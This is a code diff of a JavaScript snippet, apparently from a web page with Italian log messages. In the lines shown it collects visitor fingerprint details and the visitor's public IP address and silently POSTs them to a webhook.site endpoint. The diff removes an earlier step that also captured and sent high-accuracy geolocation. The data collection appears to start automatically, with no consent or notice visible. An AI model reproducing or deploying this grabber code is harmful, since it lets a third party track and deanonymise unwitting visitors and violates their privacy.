@@ -40,45 +40,24 @@
           colorDepth: screen.colorDepth,
         },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toString(),
+        timestamp: new Date().toISOString()
       };
 
       try {
-        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-        data.ip = ipData.ip;
+        const ip = await fetch('https://api.ipify.org?format=json')
+          .then(res => res.json());
+        data.ip = ip.ip;
       } catch (e) {
-        data.ip = 'N/A';
+        data.ip = "N/A";
       }
 
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          data.location = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
-          };
-          sendData(data);
-        },
-        err => {
-          data.location = { error: err.message };
-          sendData(data);
-        },
-        { enableHighAccuracy: true, timeout: 5000 }
-      );
-    }
-
-    function sendData(data) {
       fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       })
-      .then(response => {
-        console.log('Dati inviati, risposta webhook:', response.status);
-        return response.text();
-      })
-      .then(text => console.log('Risposta webhook (testo):', text))
-      .catch(err => console.error('Errore invio dati:', err));
+      .then(res => console.log("✅ Dati inviati con successo"))
+      .catch(err => console.error("❌ Errore invio dati:", err));
     }
 
     collectData();
